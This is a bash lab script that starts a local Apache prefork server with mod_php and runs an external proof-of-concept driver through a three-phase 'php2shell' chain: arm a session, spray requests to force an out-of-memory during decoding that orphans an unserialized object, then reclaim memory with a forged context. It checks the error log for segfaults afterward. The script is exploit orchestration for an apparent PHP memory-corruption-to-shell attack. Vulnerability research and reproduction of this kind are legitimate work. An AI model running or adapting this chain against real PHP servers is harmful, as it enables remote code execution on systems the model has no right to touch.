#!/bin/bash
# Apache prefork + mod_php lab for the php2shell chain. Args: port p1_spray fire_spray mem
set -u
PORT=${1:-18120}
P1SP=${2:-450}
FSP=${3:-450}
MEM=${4:-8M}
ROOT=/tmp/php2shell_ap
SID=u0123456789abcdefghijklmnopqrstuv
HERE=$(cd "$(dirname "$0")" && pwd)
POC=${POC:-$HERE/../tool/poc_unserialize.py}
[ -f "$POC" ] || { echo "driver not found: $POC"; exit 1; }

pkill -f "apache2" 2>/dev/null; sleep 0.5
rm -rf "$ROOT"; mkdir -p "$ROOT/sess" "$ROOT/html"
cp "$HERE/lab_index.php" "$ROOT/html/index.php"

cat > "$ROOT/httpd.conf" << EOF
ServerName localhost
Listen 127.0.0.1:$PORT
PidFile $ROOT/httpd.pid
ErrorLog $ROOT/error.log
LogLevel debug
TypesConfig /etc/mime.types
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule php_module /usr/lib/apache2/modules/libphp8.1.so
DocumentRoot $ROOT/html
<Directory $ROOT/html>
  Require all granted
  DirectoryIndex index.php
</Directory>
<FilesMatch \.php$>
  SetHandler application/x-httpd-php
</FilesMatch>
php_admin_flag display_errors off
php_admin_value memory_limit $MEM
php_admin_value post_max_size 32M
php_admin_value upload_max_filesize 32M
php_admin_value max_file_uploads 25
php_admin_value session.upload_progress.min_freq 0
php_admin_value session.save_path $ROOT/sess
EOF

httpd2() { /usr/sbin/apache2 -f "$ROOT/httpd.conf" -k "$@"; }
httpd2 start
UP=0
for i in $(seq 1 40); do
  if curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/index.php"; then UP=1; break; fi
  sleep 0.3
done
[ "$UP" = 1 ] || { echo APACHE-NEVER-UP; tail -10 "$ROOT/error.log"; exit 1; }
echo "apache up (prefork + mod_php $MEM)"

echo "=== phase 1: arm ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-p1 --skip-fire 2>&1 | grep -E 'arm |status'
ls -la "$ROOT/sess" | tail -2
rm -f "$ROOT/sess/sess_$SID"
echo "(arm sess file removed)"

echo "=== phase 2: pressure (decode OOM -> unserialize orphan) ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-arm --skip-fire --p1-spray "$P1SP" 2>&1 | grep -E 'p1 |status'
ls -la "$ROOT/sess" | tail -2

echo "=== phase 3: fire (reclaim + forged context walk) ==="
timeout 60 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" \
  --skip-arm --skip-p1 --fire-sid "$SID" --spray "$FSP" 2>&1 | grep -E 'fire |status|HIT'
sleep 1
echo "--- error.log fatals ---"
grep -E 'Fatal|SIGSEGV|segfault|Allowed memory' "$ROOT/error.log" | tail -8
httpd2 stop 2>/dev/null
pkill apache2 2>/dev/null
true
